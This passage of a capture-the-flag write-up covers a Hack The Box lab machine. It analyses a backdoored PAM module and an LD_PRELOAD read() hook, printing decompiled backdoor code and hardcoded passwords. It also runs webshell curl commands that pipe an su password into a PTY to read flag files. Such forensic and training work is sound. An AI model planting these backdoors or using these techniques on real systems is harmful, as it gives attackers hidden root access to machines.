-rw-r--r-- 1 root   root   249144 2016-02-07 10:11:02.0000000000 UTC /lib/x86_64-linux-gnu/libreadline.so.5.2
-rw-r--r-- 1 root   root    34968 2016-02-07 10:11:02.0000000000 UTC /lib/x86_64-linux-gnu/libhistory.so.5.2
-rw-r--r-- 1 root   root    10152 2016-08-11 12:52:18.0000000000 UTC /lib/x86_64-linux-gnu/libulockmgr.so.1.0.1
-rw-r--r-- 1 root   root   243832 2016-08-11 12:52:18.0000000000 UTC /lib/x86_64-linux-gnu/libfuse.so.2.9.7
-rw-r--r-- 1 root   root    22520 2016-10-05 16:47:51.0000000000 UTC /lib/x86_64-linux-gnu/libmnl.so.0.2.0
-rw-r--r-- 1 root   root      190 2016-11-25 11:16:17.0000000000 UTC /lib/udev/rules.d/80-ifupdown.rules
-rw-r--r-- 1 root   root      735 2016-11-25 11:16:17.0000000000 UTC /lib/systemd/system/networking.service
-rw-r--r-- 1 root   root      626 2016-11-28 13:40:17.0000000000 UTC /lib/systemd/system/ifup@.service
...[snip]...

```

But if I just want to look at files not installed by `dpkg`, there’s only 21:

```

sysadmin@compromised:/var/www$ find /lib  -type f -printf "%M %n %-6u %-6g %6s %TY-%Tm-%Td %TT %TZ %h/%f\n" | sort -k 6,7 | grep -v ".0000000000" | wc -l
21

```

Of those 21, the last two are really interesting:

```

sysadmin@compromised:/var/www$ find /lib  -type f -printf "%M %n %-6u %-6g %6s %TY-%Tm-%Td %TT %TZ %h/%f\n" | sort -k 6,7 | grep -v ".0000000000"
-rw-r--r-- 1 root   root   553682 2020-05-08 15:39:39.7166620120 UTC /lib/modules/4.15.0-99-generic/modules.dep
-rw-r--r-- 1 root   root   782364 2020-05-08 15:39:39.7366640620 UTC /lib/modules/4.15.0-99-generic/modules.dep.bin
-rw-r--r-- 1 root   root   1283733 2020-05-08 15:39:39.7566661120 UTC /lib/modules/4.15.0-99-generic/modules.alias
-rw-r--r-- 1 root   root   1263999 2020-05-08 15:39:39.8966804600 UTC /lib/modules/4.15.0-99-generic/modules.alias.bin
-rw-r--r-- 1 root   root      567 2020-05-08 15:39:39.9166825100 UTC /lib/modules/4.15.0-99-generic/modules.softdep
-rw-r--r-- 1 root   root   591899 2020-05-08 15:39:39.9286837400 UTC /lib/modules/4.15.0-99-generic/modules.symbols
-rw-r--r-- 1 root   root   721938 2020-05-08 15:39:39.9846894800 UTC /lib/modules/4.15.0-99-generic/modules.symbols.bin
-rw-r--r-- 1 root   root     9685 2020-05-08 15:39:39.9926903000 UTC /lib/modules/4.15.0-99-generic/modules.builtin.bin
-rw-r--r-- 1 root   root      317 2020-05-08 15:39:40.0126923510 UTC /lib/modules/4.15.0-99-generic/modules.devname
-r--r--r-- 1 root   root   8962391 2020-05-08 15:58:30.6773677010 UTC /lib/udev/hwdb.bin
-rw-r--r-- 1 root   root   554016 2020-05-28 06:09:14.1800803540 UTC /lib/modules/4.15.0-101-generic/modules.dep
-rw-r--r-- 1 root   root   782762 2020-05-28 06:09:14.1880798190 UTC /lib/modules/4.15.0-101-generic/modules.dep.bin
-rw-r--r-- 1 root   root   1283903 2020-05-28 06:09:14.1960792830 UTC /lib/modules/4.15.0-101-generic/modules.alias
-rw-r--r-- 1 root   root   1264166 2020-05-28 06:09:14.2400763370 UTC /lib/modules/4.15.0-101-generic/modules.alias.bin
-rw-r--r-- 1 root   root      567 2020-05-28 06:09:14.2520755330 UTC /lib/modules/4.15.0-101-generic/modules.softdep
-rw-r--r-- 1 root   root   591899 2020-05-28 06:09:14.2560752660 UTC /lib/modules/4.15.0-101-generic/modules.symbols
-rw-r--r-- 1 root   root   721938 2020-05-28 06:09:14.2800736590 UTC /lib/modules/4.15.0-101-generic/modules.symbols.bin
-rw-r--r-- 1 root   root     9685 2020-05-28 06:09:14.2840733910 UTC /lib/modules/4.15.0-101-generic/modules.builtin.bin
-rw-r--r-- 1 root   root      317 2020-05-28 06:09:14.2920728550 UTC /lib/modules/4.15.0-101-generic/modules.devname
-rw-r--r-- 1 root   root   198440 2020-08-31 03:25:17.4559916850 UTC /lib/x86_64-linux-gnu/security/.pam_unix.so
-rw-r--r-- 1 root   root   198440 2020-08-31 03:25:57.6079903490 UTC /lib/x86_64-linux-gnu/security/pam_unix.so

```

It’s not normal to have a `.pam_unix.so` file. Interestingly, they are the same size. My guess based on timestamps is that the original good `pam_unix.so` was moved to `.pam_unix`, and then a new malicious one was put in place.

I’ll grab a copy over SCP:

```

root@kali# scp -i ~/keys/ed25519_gen mysql@10.10.10.207:/lib/x86_64-linux-gnu/security/pam_unix.so .
pam_unix.so                  100%  194KB 920.2KB/s   00:00

```

### Patch Comparison

#### Get Legit Version

`strings` will provide all the ASCII strings in the binary, which is a good place to start looking for clues. One that jumped out gives a version:

```

/tmp/Linux-PAM-1.1.8/modules/pam_unix

```

I’ll grab a copy of the legit binary from [this link](https://launchpad.net/ubuntu/bionic/amd64/libpam-modules/1.1.8-3.6ubuntu2).

#### Ghidra Version Tracking

The Version Tracking tool comes as part of the default Ghidra install, and is represented by the footsteps icon next to the code browser icon in the Tool Chest:

![image-20210118114315433](https://0xdfimages.gitlab.io/img/image-20210118114315433.png)

I’ll need to first import each of the two files into a project, and analyzed them (opening them in the Code browser will trigger that).

Then I can start a version track by clicking the footsteps. In the window that opens, I’ll click the footsteps again:

[![image-20210118114446306](https://0xdfimages.gitlab.io/img/image-20210118114446306.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20210118114446306.png)

I’ll provide a name and the two binaries:

![image-20210118114520379](https://0xdfimages.gitlab.io/img/image-20210118114520379.png)

On the next screen, I’ll run the Precondition Checks, and then hit next (even if a couple return warnings). On hitting finish, Version Tracking windows are opened for both binaries. In the main version tracking window, I’ll hit the wand button to “Run several correlators and apply good matches”. Thjis adds a bunch of lines to the matches window, each being examples of things that match according to the diagnostic run.

[![image-20210118115805423](https://0xdfimages.gitlab.io/img/image-20210118115805423.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20210118115805423.png)

Everything in there now has a Score of 1, which indicates a perfect match (according to what that algorithm looks at).

Clicking on the plus icon to “Add additional correlations”, I can see what’s already been run by the green previous flags:

[![image-20210118115857742](https://0xdfimages.gitlab.io/img/image-20210118115857742.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20210118115857742.png)

Because I’m looking for function changes, I’ll add Function Reference Match, and hit next and finish. This finds several matches with score less than 1. I can adjust the filter to show only things between 0 and 0.99:

[![image-20210118120106671](https://0xdfimages.gitlab.io/img/image-20210118120106671.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20210118120106671.png)

`pam_sm_authenticate` is particularly interesting both because of what I can guess it does, and because the size went from 579 to 633 in the change. Clicking on it loads the two disassemblies side by side at the bottom:

[![image-20210118120359214](https://0xdfimages.gitlab.io/img/image-20210118120359214.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20210118120359214.png)

Right away, I can see there’s an extra 15 character array, `backdoor`. Scrolling down a bit, there’s an extra check if the given password matches `backdoor`, and then it continues just like the original:

[![image-20210118120530557](https://0xdfimages.gitlab.io/img/image-20210118120530557.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20210118120530557.png)

It’s setting `backdoor` to a static value, “7a6c6b657e5533456e7638326d322d”. To get ASCII from hex:

```

root@kali# echo "7a6c6b657e5533456e7638326d322d" | xxd -r -p
zlke~U3Env82m2-

```

### su

That will work as the password for any user, including root:

```

sysadmin@compromised:~$ su -
Password: 
root@compromised:~#

```

## Path #2: Shell as root via LDPreload

### Enumeration

Another common hacker technique on Linux is to hook functions via `LDPRELOAD`. The file at `/etc/ld.so.preload` will give a list of files libraries to load first. Typically this file is empty:

```

sysadmin@compromised:~$ cat /etc/ld.so.preload 
/lib/x86_64-linux-gnu/libdate.so

```

I’ll pull that back for analysis.

```

root@kali# scp -i ~/keys/ed25519_gen mysql@10.10.10.207:/lib/x86_64-linux-gnu/libdate.so .
libdate.so                    100%   13KB 155.1KB/s   00:00

```

### Ghidra

Unlike the other file, which was a slightly modified legit library, this `.so` is attempting to hijack control over certain library calls. Because of it’s position in preload, if a call is made and it’s in this library, it will run this one. Otherwise, it will look in normal GLIBC and other shared objects for the function.

`libdate.so` exports a single function, `read`:

![image-20210118134549437](https://0xdfimages.gitlab.io/img/image-20210118134549437.png)

The `read` function looks like:

[![image-20210118140241107](https://0xdfimages.gitlab.io/img/image-20210118140241107.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20210118140241107.png)

I’ll clean this up. `DAT_00102000` holds the value “read”. `local_38` is a string that is used like a password.

```

ssize_t read(int __fd,void *__buf,size_t __nbytes)

{
  code *read_libc;
  ssize_t read_ret;
  char *backdoor;
  char password [16];
  
  read_libc = (code *)dlsym(0xffffffffffffffff,&read);
  read_ret = (*read_libc)((ulong)(uint)__fd,__buf,__nbytes,__buf,read_libc);
  password[0] = '2';
  password[1] = 'w';
  password[2] = 'k';
  password[3] = 'e';
  password[4] = 'O';
  password[5] = 'U';
  password[6] = '4';
  password[7] = 's';
  password[8] = 'j';
  password[9] = 'v';
  password[10] = '8';
  password[11] = '4';
  password[12] = 'o';
  password[13] = 'k';
  password[14] = '/';
  password[15] = '\0';
  backdoor = strstr((char *)__buf,password);
  if (backdoor != (char *)0x0) {
    setgid(0);
    setuid(0);
    execve("/bin/sh",(char **)0x0,(char **)0x0);
  }
  return read_ret;
}

```

So it uses `dlsym` to get the real `read` function, and then calls it with the parameters passed in. It checks if the result contains the string “2wkeOU4sjv84ok/”, and if so, it starts a shell. Otherwise, it returns the actual return value from `read`.

When it calls the shell, it first runs `setgid(0)` and `setuid(0)`, so as long as the process is running as root, the shell will also be running as root.

### Shell

One SUID binary that takes input (ie, uses `read`) is `passwd`. If I provide this string as the current password, instead of rejecting it as wrong, it just returns a root shell:

```

sysadmin@compromised:/var/lib/mysql$ passwd
Changing password for sysadmin.
(current) UNIX password: sh: 0: can't access tty; job control turned off
# reset: unknown terminal type unknown
Terminal type? screen
# id
uid=0(root) gid=0(root) groups=0(root),1000(sysadmin) 

```

Interestingly, if I try to even `echo` that string, it crashes my SSH connection:

```

root@kali# ssh -i ~/keys/ed25519_gen mysql@10.10.10.207
Last login: Mon Jan 18 19:28:09 2021 from 10.10.14.4
mysql@compromised:~$ echo "2wkeOU4sjv84ok"
2wkeOU4sjv84ok
mysql@compromised:~$ echo "2wkeOU4sjv84ok/"
Connection to 10.10.10.207 closed by remote host.
Connection to 10.10.10.207 closed.

```

Perhaps trying to run `setuid(0)` as an unprivileged user is causing a crash.

## Beyond Root - Root from Webshell

It turns out that [this trick](https://www.sans.org/blog/sneaky-stealthy-su-in-web-shells/) works to run `su` from the webshell. The [TheATeam](https://www.hackthebox.eu/home/teams/profile/1750) got first blood by using the webshell to find the PAM backdoor, and then executing it from the webshell like this:

```

root@kali# curl -G http://10.10.10.207/shop/admin/../vqmod/xml/SVR49.php --data-urlencode "c=(sleep 1; echo zlke~U3Env82m2-) | python3 -c \"import pty;pty.spawn(['/bin/su','-c','id']);\""
Password: 
uid=0(root) gid=0(root) groups=0(root)

```

The trick here is to use `sleep` to allow the Python PTY time to start, and then to send the `su` password (that is accepted because of the backdoored PAM module) into that PTY with the command. Both flags can be read from here:

```

root@kali# curl -G http://10.10.10.207/shop/admin/../vqmod/xml/SVR49.php --data-urlencode "c=(sleep 1; echo zlke~U3Env82m2-) | python3 -c \"import pty;pty.spawn(['/bin/su','-c','cat /home/*/user.txt /root/root.txt']);\""
Password: 
46dbea70************************
77c16789************************

```